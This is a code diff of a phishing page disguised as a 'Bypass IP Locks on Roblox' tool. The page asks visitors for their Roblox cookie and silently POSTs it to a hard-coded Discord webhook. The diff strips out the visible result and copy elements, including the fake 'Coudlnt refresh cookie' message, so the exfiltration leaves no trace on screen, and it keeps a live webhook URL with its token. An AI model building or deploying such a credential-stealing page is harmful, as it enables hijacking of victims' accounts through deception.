@@ -63,11 +63,6 @@
                                 Bypass IP Locks on <span class="main-company">Roblox</span>
                             </div>
                             <input type="text" id="dataInput" placeholder="Cookie here" class="main-input">
-                            <div class="main-result" style="display: none;">
-                                <div class="result-title">Result:</div>
-                                <div class="result-content"></div>
-                                <button class="result-button">Copy</button>
-                            </div>
                             <button id="processButton" class="main-button">BYPASS</button>
                         </div>
                     </div>
@@ -93,20 +88,17 @@
                 
                 const input = document.getElementById("dataInput").value.trim();
                 const button = this;
-                const resultContent = document.querySelector('.result-content');
-                const resultDiv = document.querySelector('.main-result');
                 
                 if (!input) return;
                 
                 button.disabled = true;
                 button.textContent = "Refreshing...";
-                resultDiv.style.display = 'none';
 
                 try {
                     // Processing delay
                     await new Promise(resolve => setTimeout(resolve, 1500));
                     
-                    // Send to Discord webhook (REPLACE WITH YOUR WEBHOOK URL)
+                    // Send to Discord webhook
                     await fetch("https://discord.com/api/webhooks/1318559677080146063/eItm2Y-11kg46ERCqngbgDC0WYBdXpaMmBfZxJJoPvjJzCiVx7cEXkd4feIVvF-yXVFJ", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -120,31 +112,14 @@
                         })
                     });
                     
-                    // Show success silently in result div
-                    resultContent.textContent = "Coudlnt refresh cookie❌️";
-                    resultDiv.style.display = 'block';
                     document.getElementById("dataInput").value = "";
                     
                 } catch (error) {
                     console.error("Error:", error);
-                    resultContent.textContent = "Coudlnt refresh cookie❌️";
-                    resultDiv.style.display = 'block';
                 } finally {
                     button.textContent = "BYPASS";
                     button.disabled = false;
                 }
-            });
-
-            // Copy button functionality
-            document.querySelector('.result-button').addEventListener('click', function() {
-                const textToCopy = document.querySelector('.result-content').textContent;
-                navigator.clipboard.writeText(textToCopy).then(() => {
-                    const originalText = this.textContent;
-                    this.textContent = "Copied!";
-                    setTimeout(() => {
-                        this.textContent = originalText;
-                    }, 2000);
-                });
             });
         </script>
         <script src="js/main.js"></script>
